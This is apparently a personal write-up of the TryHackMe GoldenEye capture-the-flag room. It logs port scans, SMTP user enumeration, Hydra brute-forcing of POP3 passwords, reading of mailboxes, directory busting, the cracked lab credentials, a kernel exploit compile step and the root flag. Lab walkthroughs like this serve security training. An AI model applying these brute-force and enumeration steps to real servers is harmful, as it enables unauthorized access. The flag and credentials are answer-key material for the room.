@@ -1,0 +1,375 @@
+#+TITLE: 007
+
+* nmap
+
+#+begin_src bash
+
+┌─[root@parrot-virtual]─[~/haxx/ctf/thm/007]
+└──╼ # nmap -sC -sV -oA nmap/scan 10.10.88.210 -p-
+Starting Nmap 7.91 ( https://nmap.org  ) at 2020-11-13 08:00 EST
+Nmap scan report for 10.10.88.210
+Host is up (0.11s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: TLS randomness does not represent time
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+55006/tcp open  ssl/unknown
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+|_ssl-date: TLS randomness does not represent time
+55007/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: STLS AUTH-RESP-CODE UIDL RESP-CODES SASL(PLAIN) USER CAPA TOP PIPELINING
+|_ssl-date: TLS randomness does not represent time
+
+        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+        Nmap done: 1 IP address (1 host up) scanned in 440.38 seconds
+
+#+end_src
+
+* website
+view-source:http://10.10.88.210/terminal.js
+- hash
+  : &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+  - cracked
+    : InvincibleHack3r
+
+#+begin_src js
+
+        var data = [
+  {
+    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
+  }
+];
+
+//
+//Boris, make sure you update your default password.
+//My sources say MI6 maybe planning to infiltrate.
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+//
+//BTW Natalya says she can break your codes
+//
+
+var allElements = document.getElementsByClassName("typeing");
+for (var j = 0; j < allElements.length; j++) {
+  var currentElementId = allElements[j].id;
+  var currentElementIdContent = data[0][currentElementId];
+  var element = document.getElementById(currentElementId);
+  var devTypeText = currentElementIdContent;
+
+
+  var i = 0, isTag, text;
+  (function type() {
+    text = devTypeText.slice(0, ++i);
+    if (text === devTypeText) return;
+    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
+    var char = text.slice(-1);
+    if (char === "<") isTag = true;
+    if (char === ">") isTag = false;
+    if (isTag) return type();
+    setTimeout(type, 60);
+  })();
+}
+
+#+end_src
+
+* msf
+
+#+begin_src bash
+
+msf6 auxiliary(scanner/smtp/smtp_enum) > run
+
+        [*] 10.10.88.210:25       - 10.10.88.210:25 Banner: 220 ubuntu GoldentEye SMTP Electronic-Mail agent
+        [+] 10.10.88.210:25       - 10.10.88.210:25 Users found: , backup, bin, daemon, games, gnats, irc, libuuid, list, lp, mail, man, messagebus, news, nobody, postfix, postgres, postmaster, proxy, sync, sys, syslog, uucp, www-data
+        [*] 10.10.88.210:25       - Scanned 1 of 1 hosts (100% complete)
+        [*] Auxiliary module execution completed
+
+#+end_src
+
+* hydra
+
+#+begin_src bash
+
+┌─[root@parrot-virtual]─[~/haxx/ctf/thm/007]
+└──╼ # hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.88.137:55007
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-13 11:31:22
+        [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+        [DATA] attacking pop3://10.10.88.137:55007/
+        [STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+        [STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
+        [55007][pop3] host: 10.10.88.137   login: doak   password: goat
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-13 11:33:46
+
+┌─[root@parrot-virtual]─[~/haxx/ctf/thm/007]
+└──╼ # hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://10.10.88.137:55007
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-13 09:31:02
+        [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+        [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+        [DATA] attacking pop3://10.10.88.137:55007/
+        [STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+        [STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
+        [55007][pop3] host: 10.10.88.137   login: boris   password: secret1!
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-13 09:33:53
+
+┌─[root@parrot-virtual]─[~/haxx/ctf/thm/007]
+└──╼ # hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://10.10.88.137:55007
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-13 09:36:34
+        [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+        [DATA] attacking pop3://10.10.88.137:55007/
+        [STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+        [55007][pop3] host: 10.10.88.137   login: natalya   password: bird
+        [STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-13 09:38:38
+
+#+end_src
+
+* pop3
+┌─[root@parrot-virtual]─[~/haxx/ctf/thm/007]
+└──╼ # telnet 10.10.88.137 55007
+Trying 10.10.88.137...
+Connected to 10.10.88.137.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+user doak
++OK
+pass goat
++OK Logged in.
+LIST
++OK 1 messages:
+1 606
+.
+RETR 1
++OK 606 octets
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 97DC24549D
+                for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+                Message-Id: <20180425034731.97DC24549D@ubuntu>
+                Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+                From: doak@ubuntu
+
+                James,
+                If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+                Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+                username: dr_doak
+                password: 4England!
+
+- more creds
+  
+  : username: xenia
+  : password: RCP90rulez!
+
+- we manage to log in using creds
+ : boris
+
+  - LIST
+    +OK 3 messages:
+    1 544
+    2 373
+    3 921
+
+- RETR 1
+  +OK 544 octets
+  Return-Path: <root@127.0.0.1.goldeneye>
+  X-Original-To: boris
+  Delivered-To: boris@ubuntu
+  Received: from ok (localhost [127.0.0.1])
+          by ubuntu (Postfix) with SMTP id D9E47454B1
+                  for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+                  Message-Id: <20180425022326.D9E47454B1@ubuntu>
+                  Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+                  From: root@127.0.0.1.goldeneye
+
+                  Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
+
+- RETR 2
+  +OK 373 octets
+  Return-Path: <natalya@ubuntu>
+  X-Original-To: boris
+  Delivered-To: boris@ubuntu
+  Received: from ok (localhost [127.0.0.1])
+          by ubuntu (Postfix) with ESMTP id C3F2B454B1
+                  for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+                  Message-Id: <20180425024249.C3F2B454B1@ubuntu>
+                  Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+                  From: natalya@ubuntu
+
+                  Boris, I can break your codes!
+
+- RETR 3
+  +OK 921 octets
+  Return-Path: <alec@janus.boss>
+  X-Original-To: boris
+  Delivered-To: boris@ubuntu
+  Received: from janus (localhost [127.0.0.1])
+          by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+                  for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+                  Message-Id: <20180425025235.4B9F4454B1@ubuntu>
+                  Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+                  From: alec@janus.boss
+
+                  Boris,
+
+                  Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+                  Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+                  PS - Keep security tight or we will be compromised.
+
+: natalya
+- ┌─[✗]─[root@parrot-virtual]─[~/haxx/ctf/thm/007]
+  └──╼ # telnet 10.10.88.137 55007
+  Trying 10.10.88.137...
+  Connected to 10.10.88.137.
+  Escape character is '^]'.
+  +OK GoldenEye POP3 Electronic-Mail System
+  user natalya
+  +OK
+  pass bird
+  +OK Logged in.
+  LIST
+  +OK 2 messages:
+  1 631
+  2 1048
+  .
+  RETR 1
+  +OK 631 octets
+  Return-Path: <root@ubuntu>
+  X-Original-To: natalya
+  Delivered-To: natalya@ubuntu
+  Received: from ok (localhost [127.0.0.1])
+          by ubuntu (Postfix) with ESMTP id D5EDA454B1
+                  for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+                  Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+                  Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+                  From: root@ubuntu
+
+                  Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+                  Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+                  .
+                  RETR 2
+                  +OK 1048 octets
+                  Return-Path: <root@ubuntu>
+                  X-Original-To: natalya
+                  Delivered-To: natalya@ubuntu
+                  Received: from root (localhost [127.0.0.1])
+                          by ubuntu (Postfix) with SMTP id 17C96454B1
+                                  for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+                                  Message-Id: <20180425031956.17C96454B1@ubuntu>
+                                  Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+                                  From: root@ubuntu
+
+                                  Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+                                  Ok, user creds are:
+
+                                  username: xenia
+                                  password: RCP90rulez!
+
+                                  Boris verified her as a valid contractor so just create the account ok?
+
+                                  And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+                                  **Make sure to edit your host file since you usually work remote off-network....
+
+                                  Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+* gobuster
+
+http://severnaya-station.com/gnocertdir/blog/
+
+┌─[root@parrot-virtual]─[~/haxx/ctf/thm/007]
+└──╼ # gobuster dir -u http://severnaya-station.com/gnocertdir/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://severnaya-station.com/gnocertdir/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/11/13 10:47:52 Starting gobuster
+===============================================================
+/blog (Status: 301)
+/rss (Status: 301)
+/login (Status: 301)
+/files (Status: 301)
+/user (Status: 301)
+/calendar (Status: 301)
+/admin (Status: 301)
+/comment (Status: 301)
+/report (Status: 301)
+/local (Status: 301)
+/pix (Status: 301)
+/tag (Status: 301)
+/group (Status: 301)
+/my (Status: 301)
+/install (Status: 301)
+/lib (Status: 301)
+/portfolio (Status: 301)
+/notes (Status: 301)
+/message (Status: 301)
+/lang (Status: 301)
+/theme (Status: 301)
+/blocks (Status: 301)
+/tags (Status: 200)
+/question (Status: 301)
+/backup (Status: 301)
+/rating (Status: 301)
+/filter (Status: 301)
+/mod (Status: 301)
+/auth (Status: 301)
+/course (Status: 301)
+/error (Status: 301)
+/repository (Status: 301)
+/webservice (Status: 301)
+/plagiarism (Status: 301)
+Progress: 26642 / 87665 (30.39%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/11/13 10:52:29 Finished
+===============================================================
+
+* moodle
+Moodle is an open source (webbased) learning
+users all over the world in educational inst
+companies. See vendor homepage for details.
+
+* creds
+- admin
+  : xWinter1995x!
+* exploit
+- uname -a
+  : 3.13.0
+  - replacing gcc with cc inside the file
+    : sed -i "s/gcc/cc/g" 37292.c
+https://tryhackme.com/room/goldeneye
+- root
+  : 568628e0d993b1973adc718237da6e93
